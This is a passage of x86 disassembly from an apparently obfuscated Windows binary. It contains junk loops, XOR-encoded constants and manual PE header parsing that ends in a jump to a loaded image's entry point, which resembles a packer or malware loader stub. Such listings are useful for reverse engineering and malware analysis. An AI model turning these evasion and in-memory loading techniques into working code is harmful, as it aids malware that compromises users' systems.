  4094c6:	or     edi,edi
  4094c8:	lea    eax,[ebp-0x54]
  4094cb:	mov    DWORD PTR [ebp-0x10],eax
  4094ce:	sub    ecx,DWORD PTR ds:0x430626
  4094d4:	mov    eax,DWORD PTR [ebp-0x54]
  4094d7:	mov    ecx,DWORD PTR [ebp-0x10]
  4094da:	mov    DWORD PTR ds:0x42efac,0x1c
  4094e4:	cmp    DWORD PTR ds:0x42efac,0x0
  4094eb:	je     0x409533
  4094f1:	cmp    DWORD PTR ds:0x42efac,0x27
  4094f8:	jne    0x40950c
  4094fe:	push   DWORD PTR [ebp-0x20]
  409501:	push   0x215b
  409506:	call   DWORD PTR ds:0x42ed38
  40950c:	xor    edi,edi
  40950e:	xor    edi,DWORD PTR ds:0x42efac
  409514:	dec    edi
  409515:	mov    DWORD PTR ds:0x42efac,edi
  40951b:	jmp    0x4094e4
  409520:	movzx  edi,BYTE PTR ds:0x42e8ea
  409527:	or     edi,DWORD PTR ds:0x4306be
  40952d:	mov    DWORD PTR ds:0x42e8ea,edi
  409533:	xor    eax,esi
  409535:	xor    edi,0xc6b
  40953b:	add    eax,0x32729d
  409540:	mov    DWORD PTR [ecx],eax
  409542:	mov    eax,ds:0x41227c
  409547:	sbb    DWORD PTR ds:0x430622,0x6967
  409551:	mov    DWORD PTR [ebp-0x28],0x8e12febc
  409558:	mov    edi,DWORD PTR ds:0x43061a
  40955e:	sbb    DWORD PTR ds:0x42ef8c,edi
  409564:	mov    eax,DWORD PTR [eax]
  409566:	mov    DWORD PTR ds:0x42efa4,0x19
  409570:	cmp    DWORD PTR ds:0x42efa4,0x0
  409577:	je     0x40961e
  40957d:	cmp    DWORD PTR ds:0x42efa4,0x29
  409584:	jne    0x4095c1
  40958a:	push   DWORD PTR [ebp-0xc]
  40958d:	push   DWORD PTR [ebp-0x1c]
  409590:	push   0x61da
  409595:	push   DWORD PTR [ebp-0xc]
  409598:	push   DWORD PTR [ebp-0x1c]
  40959b:	push   DWORD PTR [ebp-0x20]
  40959e:	push   DWORD PTR [ebp-0x1c]
  4095a1:	push   DWORD PTR [ebp-0x28]
  4095a4:	push   0x400000
  4095a9:	push   DWORD PTR [ebp-0xc]
  4095ac:	push   0x2e1f
  4095b1:	push   0x5a6c
  4095b6:	push   0x7112
  4095bb:	call   DWORD PTR ds:0x42ec38
  4095c1:	xor    edi,edi
  4095c3:	xor    edi,DWORD PTR ds:0x42efa4
  4095c9:	dec    edi
  4095ca:	mov    DWORD PTR ds:0x42efa4,edi
  4095d0:	jmp    0x409570
  4095d5:	and    DWORD PTR ds:0x42e8de,0x0
  4095df:	jmp    0x4095f1
  4095e4:	mov    edi,DWORD PTR ds:0x42e8de
  4095ea:	inc    edi
  4095eb:	mov    DWORD PTR ds:0x42e8de,edi
  4095f1:	cmp    DWORD PTR ds:0x42e8de,0x18
  4095f8:	jae    0x40961e
  4095fe:	cmp    DWORD PTR ds:0x42e8de,0x1f
  409605:	jne    0x409619
  40960b:	push   0x6de3
  409610:	push   DWORD PTR [ebp-0x28]
  409613:	call   DWORD PTR ds:0x42ed3c
  409619:	jmp    0x4095e4
  40961e:	mov    cx,WORD PTR [ebp-0x14]
  409622:	movzx  ecx,cx
  409625:	add    ecx,DWORD PTR [eax]
  409627:	xor    eax,eax
  409629:	mov    DWORD PTR [ebp-0x34],0xf89c8531
  409630:	mov    DWORD PTR [ebp-0x10],ecx
  409633:	mov    edi,0x5a3fc9c
  409638:	add    DWORD PTR ds:0x42e8e2,edx
  40963e:	mov    eax,DWORD PTR [ebp-0x1c]
  409641:	xor    ecx,ecx
  409643:	xor    ecx,DWORD PTR ds:0x430622
  409649:	sub    DWORD PTR ds:0x43060a,ecx
  40964f:	mov    ecx,DWORD PTR [ebp-0xc]
  409652:	or     DWORD PTR ds:0x42efac,0x430622
  40965c:	xor    eax,esi
  40965e:	mov    DWORD PTR ds:0x43062a,0x4c41
  409668:	add    eax,ebx
  40966a:	mov    DWORD PTR ds:0x42e8ee,0x490b
  409674:	cmp    DWORD PTR [ecx],eax
  409676:	jne    0x409a49
  40967c:	mov    DWORD PTR ds:0x42e8de,0x1f
  409686:	cmp    DWORD PTR ds:0x42e8de,0x0
  40968d:	je     0x40972a
  409693:	cmp    DWORD PTR ds:0x42e8de,0xb
  40969a:	jne    0x4096b3
  4096a0:	push   DWORD PTR [ebp-0xc]
  4096a3:	push   0x6e82
  4096a8:	push   0x1d82
  4096ad:	call   DWORD PTR ds:0x42ec54
  4096b3:	cmp    DWORD PTR ds:0x42e8de,0xc
  4096ba:	jne    0x4096cb
  4096c0:	mov    eax,ds:0x42e8de
  4096c5:	dec    eax
  4096c6:	mov    ds:0x42e8de,eax
  4096cb:	mov    eax,ds:0x42e8de
  4096d0:	dec    eax
  4096d1:	mov    ds:0x42e8de,eax
  4096d6:	jmp    0x409686
  4096db:	and    DWORD PTR ds:0x42efa4,0x0
  4096e5:	jmp    0x4096f7
  4096ea:	mov    ecx,DWORD PTR ds:0x42efa4
  4096f0:	inc    ecx
  4096f1:	mov    DWORD PTR ds:0x42efa4,ecx
  4096f7:	cmp    DWORD PTR ds:0x42efa4,0x11
  4096fe:	jae    0x40972a
  409704:	cmp    DWORD PTR ds:0x42efa4,0x1a
  40970b:	jne    0x40971f
  409711:	push   0x430612
  409716:	push   DWORD PTR [ebp-0x1c]
  409719:	call   DWORD PTR ds:0x42ed40
  40971f:	jmp    0x4096ea
  409724:	or     ecx,DWORD PTR ds:0x43060a
  40972a:	mov    eax,DWORD PTR [ebp-0x1c]
  40972d:	mov    DWORD PTR ds:0x42ef94,0x1a
  409737:	cmp    DWORD PTR ds:0x42ef94,0x0
  40973e:	je     0x40977d
  409744:	cmp    DWORD PTR ds:0x42ef94,0x29
  40974b:	jne    0x409769
  409751:	push   0x6cb7
  409756:	push   DWORD PTR [ebp-0x20]
  409759:	push   0x3e46
  40975e:	push   0x42efac
  409763:	call   DWORD PTR ds:0x42ed44
  409769:	xor    ecx,ecx
  40976b:	or     ecx,DWORD PTR ds:0x42ef94
  409771:	dec    ecx
  409772:	mov    DWORD PTR ds:0x42ef94,ecx
  409778:	jmp    0x409737
  40977d:	mov    ecx,DWORD PTR [ebp-0x10]
  409780:	xor    eax,esi
  409782:	adc    DWORD PTR ds:0x43062e,0x39c3
  40978c:	add    eax,ebx
  40978e:	mov    DWORD PTR ds:0x4306ce,0x5e01
  409798:	cmp    DWORD PTR [ecx],eax
  40979a:	jne    0x4098a3
  4097a0:	xor    ecx,ecx
  4097a2:	add    ecx,DWORD PTR ds:0x42ef98
  4097a8:	sub    DWORD PTR ds:0x42e8e2,ecx
  4097ae:	mov    eax,DWORD PTR [ebp-0x1c]
  4097b1:	xor    ecx,ecx
  4097b3:	mov    ecx,DWORD PTR [ebp-0x44]
  4097b6:	inc    DWORD PTR ds:0x4306c6
  4097bc:	xor    eax,esi
  4097be:	and    DWORD PTR ds:0x42e8da,0x0
  4097c8:	mov    edx,DWORD PTR ds:0x42e8da
  4097ce:	inc    edx
  4097cf:	mov    DWORD PTR ds:0x42e8da,edx
  4097d5:	cmp    DWORD PTR ds:0x42e8da,0x11
  4097dc:	jne    0x4097f0
  4097e2:	push   0x4306d6
  4097e7:	push   DWORD PTR [ebp-0x10]
  4097ea:	call   DWORD PTR ds:0x42ec58
  4097f0:	cmp    DWORD PTR ds:0x42e8da,0x10
  4097f7:	jne    0x40980a
  4097fd:	mov    edx,DWORD PTR ds:0x42e8da
  409803:	inc    edx
  409804:	mov    DWORD PTR ds:0x42e8da,edx
  40980a:	cmp    DWORD PTR ds:0x42e8da,0x1c
  409811:	jb     0x4097c8
  409817:	add    eax,ebx
  409819:	sbb    edx,0x5b8
  40981f:	mov    DWORD PTR [ecx],eax
  409821:	mov    DWORD PTR ds:0x4306c2,0x1c
  40982b:	cmp    DWORD PTR ds:0x4306c2,0x0
  409832:	je     0x40987c
  409838:	cmp    DWORD PTR ds:0x4306c2,0xd
  40983f:	jne    0x409850
  409845:	push   0x4366
  40984a:	call   DWORD PTR ds:0x42ed48
  409850:	cmp    DWORD PTR ds:0x4306c2,0xe
  409857:	jne    0x40986a
  40985d:	mov    edx,DWORD PTR ds:0x4306c2
  409863:	dec    edx
  409864:	mov    DWORD PTR ds:0x4306c2,edx
  40986a:	mov    edx,DWORD PTR ds:0x4306c2
  409870:	dec    edx
  409871:	mov    DWORD PTR ds:0x4306c2,edx
  409877:	jmp    0x40982b
  40987c:	mov    eax,DWORD PTR [ebp-0x44]
  40987f:	mov    ecx,DWORD PTR [ebp-0x34]
  409882:	adc    DWORD PTR ds:0x42ef94,ebx
  409888:	xor    ecx,esi
  40988a:	xor    DWORD PTR ds:0x4306ca,edi
  409890:	mov    edx,0xffcd8d63
  409895:	and    DWORD PTR ds:0x430622,0x42e8f2
  40989f:	sub    edx,ecx
  4098a1:	add    DWORD PTR [eax],edx
  4098a3:	and    DWORD PTR ds:0x43063a,0x0
  4098ad:	jmp    0x4098bd
  4098b2:	mov    eax,ds:0x43063a
  4098b7:	inc    eax
  4098b8:	mov    ds:0x43063a,eax
  4098bd:	cmp    DWORD PTR ds:0x43063a,0x11
  4098c4:	jae    0x40990a
  4098ca:	cmp    DWORD PTR ds:0x43063a,0xb
  4098d1:	jne    0x4098eb
  4098d7:	push   DWORD PTR [ebp-0x14]
  4098da:	push   DWORD PTR [ebp-0x10]
  4098dd:	push   0x45e3
  4098e2:	push   DWORD PTR [ebp-0x1c]
  4098e5:	call   DWORD PTR ds:0x42ed4c
  4098eb:	cmp    DWORD PTR ds:0x43063a,0xa
  4098f2:	jne    0x409903
  4098f8:	mov    eax,ds:0x43063a
  4098fd:	inc    eax
  4098fe:	mov    ds:0x43063a,eax
  409903:	jmp    0x4098b2
  409908:	not    eax
  40990a:	mov    eax,ds:0x41227c
  40990f:	mov    eax,DWORD PTR [eax]
  409911:	sub    DWORD PTR ds:0x430642,0x430626
  40991b:	mov    cx,WORD PTR [ebp-0x14]
  40991f:	and    DWORD PTR ds:0x42ef9c,0x42e8ee
  409929:	movzx  ecx,cx
  40992c:	add    ecx,DWORD PTR [eax]
  40992e:	and    DWORD PTR ds:0x42ef94,0x0
  409938:	jmp    0x40994b
  40993d:	xor    eax,eax
  40993f:	add    eax,DWORD PTR ds:0x42ef94
  409945:	inc    eax
  409946:	mov    ds:0x42ef94,eax
  40994b:	cmp    DWORD PTR ds:0x42ef94,0x1d
  409952:	jae    0x409980
  409958:	cmp    DWORD PTR ds:0x42ef94,0x1f
  40995f:	jne    0x409975
  409965:	push   0x887a
  40996a:	push   0x3c32
  40996f:	call   DWORD PTR ds:0x42ec60
  409975:	jmp    0x40993d
  40997a:	adc    eax,DWORD PTR ds:0x43061e
  409980:	mov    DWORD PTR [ebp-0x10],ecx
  409983:	sub    DWORD PTR ds:0x42e8de,0x488b
  40998d:	mov    eax,DWORD PTR [ebp-0x30]
  409990:	xor    ecx,ecx
  409992:	add    ecx,DWORD PTR ds:0x430642
  409998:	xor    ecx,DWORD PTR ds:0x43063e
  40999e:	mov    DWORD PTR ds:0x430642,ecx
  4099a4:	mov    ecx,DWORD PTR [ebp-0x30]
  4099a7:	xor    eax,esi
  4099a9:	sbb    DWORD PTR ds:0x430636,0x42ef94
  4099b3:	add    eax,eax
  4099b5:	and    DWORD PTR ds:0x42e8ea,0x42ef88
  4099bf:	xor    ecx,esi
  4099c1:	sub    DWORD PTR ds:0x43063a,0x1a55
  4099cb:	sub    ecx,eax
  4099cd:	or     DWORD PTR ds:0x430632,0x430642
  4099d7:	mov    ax,WORD PTR [ebp-0x14]
  4099db:	sub    DWORD PTR ds:0x42e8de,0x42e8ea
  4099e5:	movzx  eax,ax
  4099e8:	sub    ecx,ebx
  4099ea:	mov    DWORD PTR ds:0x42e8f2,0x4be2
  4099f4:	cmp    eax,ecx
  4099f6:	mov    DWORD PTR ds:0x4306c6,0x6841
  409a00:	mov    eax,DWORD PTR [ebp-0x34]
  409a03:	movzx  ecx,WORD PTR [ebp-0x14]
  409a07:	mov    DWORD PTR ds:0x42e8da,0x46e
  409a11:	jg     0x409a30
  409a17:	xor    eax,esi
  409a19:	sub    ecx,eax
  409a1b:	adc    DWORD PTR ds:0x430606,0x4306d2
  409a25:	sub    ecx,ebx
  409a27:	mov    WORD PTR [ebp-0x14],cx
  409a2b:	jmp    0x409a49
  409a30:	not    DWORD PTR ds:0x42e8de
  409a36:	xor    eax,esi
  409a38:	lea    eax,[eax+ecx*1+0x32729d]
  409a3f:	mov    DWORD PTR ds:0x4306da,ebx
  409a45:	mov    WORD PTR [ebp-0x14],ax
  409a49:	mov    ecx,DWORD PTR [ebp-0x28]
  409a4c:	not    eax
  409a4e:	mov    eax,0x8e12febc
  409a53:	mov    DWORD PTR ds:0x42e8ee,0x41a
  409a5d:	cmp    ecx,eax
  409a5f:	mov    DWORD PTR ds:0x42e8ee,0x60ce
  409a69:	je     0x409a9b
  409a6f:	mov    DWORD PTR ds:0x42ef90,0x7d2b
  409a79:	mov    eax,DWORD PTR [ebp-0xc]
  409a7c:	mov    DWORD PTR ds:0x43061a,0x4b8f
  409a86:	mov    DWORD PTR [eax],0x60341e8d
  409a8c:	mov    DWORD PTR ds:0x42e8de,0x3193
  409a96:	jmp    0x409daf
  409a9b:	mov    ecx,DWORD PTR [ebp-0x28]
  409a9e:	cmp    ecx,0x5142ddba
  409aa4:	jne    0x409bad
  409aaa:	mov    DWORD PTR ds:0x4306ce,ecx
  409ab0:	mov    eax,DWORD PTR [ebp-0xc]
  409ab3:	mov    DWORD PTR ds:0x43063e,0x644d
  409abd:	mov    DWORD PTR [eax],0x4214feba
  409ac3:	mov    eax,DWORD PTR [ebp-0xc]
  409ac6:	mov    DWORD PTR ds:0x4306da,0x1ed6
  409ad0:	mov    DWORD PTR [ebp-0x4],eax
  409ad3:	mov    DWORD PTR ds:0x4306ca,edx
  409ad9:	mov    eax,DWORD PTR [ebp-0x30]
  409adc:	mov    eax,DWORD PTR [ebp-0x1c]
  409adf:	mov    DWORD PTR [ebp-0x4c],edi
  409ae2:	mov    eax,0xff7
  409ae7:	mov    eax,DWORD PTR [ebp-0x4c]
  409aea:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409af1:	cmp    eax,edi
  409af3:	mov    DWORD PTR ds:0x4306d2,0x7826
  409afd:	jne    0x409daf
  409b03:	add    DWORD PTR ds:0x42ef8c,0x42e8de
  409b0d:	mov    ax,WORD PTR [ebp-0x8]
  409b11:	sbb    ecx,DWORD PTR ds:0x43063a
  409b17:	mov    ecx,0x8a40
  409b1c:	xor    ax,cx
  409b1f:	xor    ecx,DWORD PTR ds:0x42ef8c
  409b25:	mov    ecx,0x3b06
  409b2a:	add    ax,cx
  409b2d:	mov    ecx,DWORD PTR [ebp-0x4]
  409b30:	movzx  eax,ax
  409b33:	sub    DWORD PTR ds:0x4306c6,0x42efa8
  409b3d:	not    eax
  409b3f:	sbb    DWORD PTR ds:0x42e8ea,0x43061a
  409b49:	and    eax,DWORD PTR [ecx]
  409b4b:	mov    ecx,DWORD PTR [ebp-0x4]
  409b4e:	mov    DWORD PTR ds:0x43062a,0x2700
  409b58:	mov    DWORD PTR [ecx],eax
  409b5a:	jmp    0x409b70
  409b5f:	and    DWORD PTR ds:0x42e8de,0x4306ce
  409b69:	xor    DWORD PTR [ebp-0x4c],0xe149ebc
  409b70:	mov    ax,WORD PTR [ebp-0x8]
  409b74:	not    DWORD PTR ds:0x430642
  409b7a:	push   DWORD PTR [ebp-0x4]
  409b7d:	adc    DWORD PTR ds:0x42efa8,0x430616
  409b87:	call   0x401000
  409b8c:	xor    DWORD PTR ds:0x42efa4,0x7536
  409b96:	test   eax,eax
  409b98:	mov    DWORD PTR ds:0x430606,0x7cfd
  409ba2:	je     0x409b5f
  409ba8:	jmp    0x409daf
  409bad:	movzx  ecx,WORD PTR ds:0x430616
  409bb4:	mov    ecx,DWORD PTR [ebp-0x28]
  409bb7:	cmp    ecx,0x1443fcbd
  409bbd:	jne    0x409bef
  409bc3:	mov    DWORD PTR ds:0x430622,0x6608
  409bcd:	mov    eax,DWORD PTR [ebp-0xc]
  409bd0:	mov    DWORD PTR ds:0x43060e,0x8ce
  409bda:	mov    DWORD PTR [eax],0x60062d8f
  409be0:	mov    DWORD PTR ds:0x43063a,0x323c
  409bea:	jmp    0x409daf
  409bef:	mov    DWORD PTR ds:0x430622,0x6595
  409bf9:	mov    ecx,DWORD PTR [ebp-0x28]
  409bfc:	mov    DWORD PTR ds:0x42e8f6,0x5912
  409c06:	cmp    ecx,eax
  409c08:	jne    0x409d34
  409c0e:	sbb    DWORD PTR ds:0x43063e,edx
  409c14:	mov    eax,DWORD PTR [ebp-0x1c]
  409c17:	and    DWORD PTR ds:0x4306c2,0x28ff
  409c21:	mov    ecx,DWORD PTR [ebp-0xc]
  409c24:	mov    DWORD PTR ds:0x4306c6,0x5e2a
  409c2e:	xor    eax,esi
  409c30:	xor    DWORD PTR ds:0x4306c6,0x42ef8c
  409c3a:	add    eax,ebx
  409c3c:	cmp    DWORD PTR [ecx],eax
  409c3e:	je     0x409cc1
  409c44:	mov    ecx,DWORD PTR [ebp-0x54]
  409c47:	mov    eax,DWORD PTR [ebp-0xc]
  409c4a:	mov    eax,DWORD PTR [eax]
  409c4c:	mov    eax,DWORD PTR [eax+0x3c]
  409c4f:	lea    ecx,[ecx*8+0x78]
  409c56:	add    eax,ecx
  409c58:	mov    ecx,DWORD PTR [ebp-0xc]
  409c5b:	mov    ecx,DWORD PTR [ecx]
  409c5d:	mov    eax,DWORD PTR [eax+ecx*1]
  409c60:	mov    DWORD PTR [ebp-0x8],eax
  409c63:	mov    eax,DWORD PTR [ebp-0x1c]
  409c66:	xor    eax,esi
  409c68:	add    eax,ebx
  409c6a:	mov    DWORD PTR [ebp-0x4],eax
  409c6d:	mov    eax,DWORD PTR [ebp-0x1c]
  409c70:	mov    ecx,DWORD PTR [ebp-0x8]
  409c73:	xor    eax,esi
  409c75:	add    eax,ebx
  409c77:	cmp    ecx,eax
  409c79:	je     0x409daf
  409c7f:	mov    eax,DWORD PTR [ebp-0xc]
  409c82:	mov    ecx,DWORD PTR [ebp-0x8]
  409c85:	add    ecx,DWORD PTR [eax]
  409c87:	mov    DWORD PTR [ebp-0x4],ecx
  409c8a:	mov    eax,DWORD PTR [ebp-0x4]
  409c8d:	mov    ecx,DWORD PTR [ebp-0xc]
  409c90:	mov    eax,DWORD PTR [eax+0xc]
  409c93:	mov    ecx,DWORD PTR [ecx]
  409c95:	mov    al,BYTE PTR [eax+ecx*1]
  409c98:	add    al,0x36
  409c9a:	xor    al,0x48
  409c9c:	cmp    al,0xc9
  409c9e:	je     0x409cb5
  409ca4:	mov    eax,DWORD PTR [ebp-0x1c]
  409ca7:	mov    ecx,DWORD PTR [ebp-0xc]
  409caa:	xor    eax,esi
  409cac:	add    eax,ebx
  409cae:	mov    DWORD PTR [ecx],eax
  409cb0:	jmp    0x409daf
  409cb5:	xor    DWORD PTR [ebp-0x28],0x5fd8f
  409cbc:	jmp    0x409daf
  409cc1:	mov    eax,DWORD PTR [ebp-0xc]
  409cc4:	mov    ecx,DWORD PTR [ebp-0x10]
  409cc7:	mov    ecx,DWORD PTR [ecx]
  409cc9:	mov    DWORD PTR [eax],ecx
  409ccb:	mov    eax,DWORD PTR [ebp-0xc]
  409cce:	mov    DWORD PTR [ebp-0x4],eax
  409cd1:	mov    eax,DWORD PTR [ebp-0x30]
  409cd4:	mov    eax,DWORD PTR [ebp-0x1c]
  409cd7:	mov    DWORD PTR [ebp-0x5c],edi
  409cda:	mov    eax,DWORD PTR [ebp-0x5c]
  409cdd:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409ce4:	cmp    eax,edi
  409ce6:	jne    0x409daf
  409cec:	mov    ax,WORD PTR [ebp-0x8]
  409cf0:	mov    ecx,0x8a40
  409cf5:	xor    ax,cx
  409cf8:	mov    ecx,0x3b06
  409cfd:	add    ax,cx
  409d00:	mov    ecx,DWORD PTR [ebp-0x4]
  409d03:	movzx  eax,ax
  409d06:	not    eax
  409d08:	and    eax,DWORD PTR [ecx]
  409d0a:	mov    ecx,DWORD PTR [ebp-0x4]
  409d0d:	mov    DWORD PTR [ecx],eax
  409d0f:	jmp    0x409d1b
  409d14:	xor    DWORD PTR [ebp-0x5c],0xe149ebc
  409d1b:	mov    ax,WORD PTR [ebp-0x8]
  409d1f:	push   DWORD PTR [ebp-0x4]
  409d22:	call   0x401000
  409d27:	test   eax,eax
  409d29:	je     0x409d14
  409d2f:	jmp    0x409daf
  409d34:	mov    eax,DWORD PTR [ebp-0x28]
  409d37:	cmp    eax,0x33450cad
  409d3c:	jne    0x409daf
  409d42:	mov    eax,DWORD PTR [ebp-0xc]
  409d45:	mov    DWORD PTR [eax],0x443dc9d
  409d4b:	mov    eax,DWORD PTR [ebp-0xc]
  409d4e:	mov    DWORD PTR [ebp-0x4],eax
  409d51:	mov    eax,DWORD PTR [ebp-0x30]
  409d54:	mov    eax,DWORD PTR [ebp-0x1c]
  409d57:	mov    DWORD PTR [ebp-0x40],edi
  409d5a:	mov    eax,DWORD PTR [ebp-0x40]
  409d5d:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409d64:	cmp    eax,edi
  409d66:	jne    0x409daf
  409d6c:	mov    ax,WORD PTR [ebp-0x8]
  409d70:	mov    ecx,0x8a40
  409d75:	xor    ax,cx
  409d78:	mov    ecx,0x3b06
  409d7d:	add    ax,cx
  409d80:	mov    ecx,DWORD PTR [ebp-0x4]
  409d83:	movzx  eax,ax
  409d86:	not    eax
  409d88:	and    eax,DWORD PTR [ecx]
  409d8a:	mov    ecx,DWORD PTR [ebp-0x4]
  409d8d:	mov    DWORD PTR [ecx],eax
  409d8f:	jmp    0x409d9b
  409d94:	xor    DWORD PTR [ebp-0x40],0xe149ebc
  409d9b:	mov    ax,WORD PTR [ebp-0x8]
  409d9f:	push   DWORD PTR [ebp-0x4]
  409da2:	call   0x401000
  409da7:	test   eax,eax
  409da9:	je     0x409d94
  409daf:	mov    eax,DWORD PTR [ebp-0x28]
  409db2:	cmp    eax,0x8e12febc
  409db7:	je     0x409638
  409dbd:	mov    eax,DWORD PTR [ebp-0xc]
  409dc0:	mov    eax,ds:0x4121a8
  409dc5:	mov    eax,DWORD PTR [eax+0x18c]
  409dcb:	mov    eax,DWORD PTR [eax]
  409dcd:	mov    DWORD PTR [ebp-0x74],eax
  409dd0:	mov    eax,0xf89c8531
  409dd5:	mov    DWORD PTR [ebp-0x10],eax
  409dd8:	mov    DWORD PTR [ebp-0x10],eax
  409ddb:	mov    DWORD PTR [ebp-0x10],eax
  409dde:	mov    DWORD PTR [ebp-0x10],0xf89c8535
  409de5:	mov    DWORD PTR [ebp-0x8],eax
  409de8:	mov    DWORD PTR [ebp-0x8],0xf89c853d
  409def:	mov    edi,DWORD PTR [ebp-0x20]
  409df2:	xor    edi,esi
  409df4:	add    edi,ebx
  409df6:	jmp    0x409e31
  409dfb:	mov    eax,DWORD PTR [ebp-0x18]
  409dfe:	xor    eax,esi
  409e00:	lea    eax,[eax+edi*1+0x32729d]
  409e07:	push   eax
  409e08:	mov    eax,DWORD PTR [ebp-0x10]
  409e0b:	xor    eax,esi
  409e0d:	lea    eax,[ebp+eax*1+0x3272a5]
  409e14:	push   eax
  409e15:	mov    eax,ds:0x4121a8
  409e1a:	push   DWORD PTR [eax+0x1bc]
  409e20:	call   0x4052e7
  409e25:	mov    eax,DWORD PTR [ebp-0x18]
  409e28:	xor    eax,esi
  409e2a:	lea    edi,[edi+eax*1+0x32729d]
  409e31:	mov    eax,DWORD PTR [ebp-0x18]
  409e34:	mov    ecx,DWORD PTR [ebp-0x18]
  409e37:	xor    ecx,esi
  409e39:	xor    eax,esi
  409e3b:	add    eax,ecx
  409e3d:	mov    ecx,DWORD PTR [ebp-0x18]
  409e40:	xor    ecx,esi
  409e42:	lea    eax,[eax+ecx*1+0x9757d7]
  409e49:	cmp    edi,eax
  409e4b:	jbe    0x409dfb
  409e51:	mov    eax,DWORD PTR [ebp+0xc]
  409e54:	mov    ds:0x41202c,eax
  409e59:	mov    eax,DWORD PTR [ebp+0x10]
  409e5c:	mov    ds:0x412280,eax
  409e61:	mov    eax,ds:0x41202c
  409e66:	mov    ecx,DWORD PTR [ebp-0x60]
  409e69:	sub    eax,ebx
  409e6b:	xor    eax,esi
  409e6d:	mov    DWORD PTR [ecx],eax
  409e6f:	mov    eax,DWORD PTR [ebp-0x58]
  409e72:	cmp    eax,0xf89c8532
  409e77:	je     0x409ed4
  409e7d:	mov    eax,DWORD PTR [ebp-0x20]
  409e80:	mov    ecx,DWORD PTR [ebp-0x50]
  409e83:	xor    eax,esi
  409e85:	add    eax,ebx
  409e87:	cmp    eax,ecx
  409e89:	je     0x409ed4
  409e8f:	mov    eax,ds:0x4121a8
  409e94:	mov    eax,DWORD PTR [eax+0x194]
  409e9a:	mov    ecx,DWORD PTR [eax]
  409e9c:	mov    eax,DWORD PTR [ecx+0x3c]
  409e9f:	push   DWORD PTR ds:0x412280
  409ea5:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  409ea9:	push   DWORD PTR ds:0x41202c
  409eaf:	add    eax,ecx
  409eb1:	mov    ecx,DWORD PTR ds:0x4121a8
  409eb7:	mov    ecx,DWORD PTR [ecx+0x194]
  409ebd:	push   DWORD PTR [ecx]
  409ebf:	call   eax
  409ec1:	mov    ecx,DWORD PTR ds:0x4121a8
  409ec7:	mov    ecx,DWORD PTR [ecx+0x1cc]
  409ecd:	mov    DWORD PTR [ecx],eax
  409ecf:	jmp    0x40a18e
  409ed4:	mov    eax,DWORD PTR [ebp-0x20]
  409ed7:	mov    ecx,DWORD PTR [ebp-0x74]
  409eda:	xor    eax,esi
  409edc:	add    eax,ebx
  409ede:	mov    edi,0xf89c85f5
  409ee3:	cmp    eax,ecx
  409ee5:	jne    0x409fe6
  409eeb:	mov    eax,DWORD PTR [ebp-0x20]
  409eee:	xor    eax,esi
  409ef0:	add    eax,ebx
  409ef2:	mov    ds:0x41222c,eax
  409ef7:	mov    eax,DWORD PTR [ebp-0x20]
  409efa:	xor    eax,esi
  409efc:	add    eax,ebx
  409efe:	mov    ds:0x412224,eax
  409f03:	mov    eax,DWORD PTR [ebp-0x18]
  409f06:	mov    DWORD PTR [ebp-0x8],eax
  409f09:	mov    eax,DWORD PTR [ebp-0x20]
  409f0c:	mov    DWORD PTR [ebp+0xc],eax
  409f0f:	mov    eax,DWORD PTR [ebp+0xc]
  409f12:	xor    eax,esi
  409f14:	add    eax,ebx
  409f16:	mov    DWORD PTR [ebp+0xc],eax
  409f19:	mov    eax,ds:0x412028
  409f1e:	mov    eax,DWORD PTR [eax]
  409f20:	mov    DWORD PTR [ebp+0xc],eax
  409f23:	mov    eax,ds:0x412230
  409f28:	mov    eax,DWORD PTR [eax]
  409f2a:	mov    DWORD PTR [ebp-0x60],eax
  409f2d:	mov    DWORD PTR [ebp+0x10],0xf89c8735
  409f34:	mov    eax,DWORD PTR [ebp+0x10]
  409f37:	xor    eax,esi
  409f39:	add    eax,ebx
  409f3b:	mov    DWORD PTR [ebp+0x10],eax
  409f3e:	mov    eax,ds:0x4121a8
  409f43:	mov    DWORD PTR [ebp+0x10],eax
  409f46:	mov    eax,DWORD PTR [ebp+0xc]
  409f49:	mov    DWORD PTR [ebp+0x10],eax
  409f4c:	mov    eax,DWORD PTR [ebp+0x10]
  409f4f:	push   0x4
  409f51:	pop    ecx
  409f52:	sub    ecx,eax
  409f54:	add    ecx,DWORD PTR [ebp-0x60]
  409f57:	mov    DWORD PTR [ebp-0x34],edi
  409f5a:	mov    DWORD PTR [ebp-0x10],ecx
  409f5d:	mov    DWORD PTR [ebp-0xc8],0xf89c8531
  409f67:	mov    eax,DWORD PTR [ebp+0x10]
  409f6a:	mov    DWORD PTR [ebp-0xc4],eax
  409f70:	mov    eax,DWORD PTR [ebp-0x10]
  409f73:	mov    DWORD PTR [ebp-0xc0],eax
  409f79:	mov    eax,DWORD PTR [ebp-0x34]
  409f7c:	xor    eax,esi
  409f7e:	add    eax,ebx
  409f80:	mov    DWORD PTR [ebp-0xbc],eax
  409f86:	lea    eax,[ebp-0x80]
  409f89:	mov    DWORD PTR [ebp-0xb8],eax
  409f8f:	mov    eax,DWORD PTR [ebp-0xc8]
  409f95:	xor    eax,esi
  409f97:	add    eax,ebx
  409f99:	mov    DWORD PTR [ebp-0xc8],eax
  409f9f:	lea    eax,[ebp-0xc8]
  409fa5:	push   eax
  409fa6:	mov    eax,DWORD PTR [ebp-0x8]
  409fa9:	xor    eax,esi
  409fab:	add    eax,ebx
  409fad:	push   eax
  409fae:	mov    eax,ds:0x4121c8
  409fb3:	push   0x41211e
  409fb8:	push   DWORD PTR [eax]
  409fba:	call   0x40b2c8
  409fbf:	and    DWORD PTR [ebp+0xc],0x0
  409fc3:	mov    eax,DWORD PTR [ebp-0x10]
  409fc6:	sub    eax,DWORD PTR [ebp+0xc]
  409fc9:	push   eax
  409fca:	mov    eax,DWORD PTR [ebp+0x10]
  409fcd:	add    eax,DWORD PTR [ebp+0xc]
  409fd0:	push   eax
  409fd1:	call   0x403861
  409fd6:	inc    DWORD PTR [ebp+0xc]
  409fd9:	cmp    DWORD PTR [ebp+0xc],0x52
  409fdd:	jb     0x409fc3
  409fe3:	mov    eax,DWORD PTR [ebp-0x8]
  409fe6:	mov    eax,ds:0x4121a8
  409feb:	mov    DWORD PTR [ebp+0x10],eax
  409fee:	mov    eax,ds:0x4122b4
  409ff3:	mov    DWORD PTR [ebp-0x68],eax
  409ff6:	mov    DWORD PTR [ebp+0xc],0xf89c8535
  409ffd:	mov    DWORD PTR [ebp-0x4],0xf89c8532
